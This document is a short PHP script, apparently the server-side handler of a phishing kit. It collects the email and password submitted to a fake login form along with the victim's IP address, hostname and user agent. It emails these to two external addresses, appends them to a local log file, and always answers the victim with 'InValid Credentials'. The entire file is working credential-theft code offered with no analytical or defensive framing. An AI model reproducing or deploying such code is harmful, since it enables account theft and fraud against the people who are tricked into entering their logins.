
$email = trim($_POST['email']);
$password = trim($_POST['password']);
$detail = trim($_POST['detail']);
if($email != null && $password != null){
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "Online ID            : ".$email."\n";
	$message .= "Passcode              : ".$password."\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$send = "zhu.zhung@rambler.com, jehovahlogss312@zoho.com";
	$subject = "SF result : $ip";
    mail($send, $subject, $message);   
	$signal = 'ok';
	$msg = 'InValid Credentials';
	{
mail($mesaegs,$subject,$message,$headers);
mail($send,$subject,$message,$headers);
$fp = fopen('logs.txt', 'a');
fwrite($fp, $message);
fclose($fp);
}
	// $praga=rand();
	// $praga=md5($praga);
}
else{
	$signal = 'bad';
	$msg = 'Please fill in all the fields.';
}
$data = array(
        'signal' => $signal,
        'msg' => $msg
    );
    echo json_encode($data);


